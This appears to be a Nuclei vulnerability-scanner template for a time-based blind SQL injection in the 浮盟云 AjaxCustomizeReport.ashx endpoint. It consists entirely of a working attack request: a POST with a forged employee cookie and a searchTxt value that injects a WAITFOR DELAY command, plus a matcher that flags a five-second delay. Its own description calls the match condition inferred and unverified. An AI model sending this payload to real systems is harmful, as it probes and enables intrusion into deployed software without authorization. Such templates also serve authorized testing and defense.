id: poc-7663012857
info:
  name: 浮盟云AjaxCustomizeReport存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,unknown
http:
- raw:
  - 'POST /m/Dingding/Ajax/AjaxCustomizeReport.ashx HTTP/1.1

    Cookie: UserCookie={"empId":"1"}

    Content-Type: application/x-www-form-urlencoded


    action=GetMouldList&searchTxt=''WAITFOR DELAY''0:0:5''--'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
